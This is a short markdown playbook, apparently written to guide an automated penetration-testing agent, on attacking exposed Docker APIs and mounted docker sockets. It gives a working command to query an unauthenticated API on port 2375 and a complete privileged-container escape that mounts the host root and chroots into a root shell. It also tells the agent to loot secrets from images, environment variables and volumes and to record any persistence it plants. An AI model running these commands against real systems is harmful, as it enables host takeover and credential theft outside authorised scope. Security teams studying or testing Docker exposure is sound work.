---
name: docker
services: [docker]
summary: Docker — exposed API (2375), privileged-container host escape, socket abuse
---

# Docker playbook

An exposed Docker API, or a mounted docker socket, is full control of the host — you can run
a privileged container that mounts the host filesystem. Use `local_exec`. The commands below
are **examples** — compose your own from what you find.

## Reach the API
- Example: `local_exec("docker -H tcp://<host>:2375 ps")` (2375 = unauth; 2376 = TLS)

look for: the API answers with no auth (critical); existing containers/images to loot.

## Host escape via a privileged container
Run a container that mounts the host root and break out.
- Example: `docker -H tcp://<host>:2375 run -it --privileged --pid=host -v /:/host alpine chroot /host sh`
  → root on the host filesystem

look for: ability to run a container → host takeover.

## A mounted docker.sock (from inside a container)
If `/var/run/docker.sock` is mounted in a container you're on, the same escape works locally
via the socket.

## Loot
Image layers, env vars, and volumes hold secrets — enumerate them.

## Record
Host escape = critical; `record_persistence` anything planted; `record_credential` secrets from images/env.
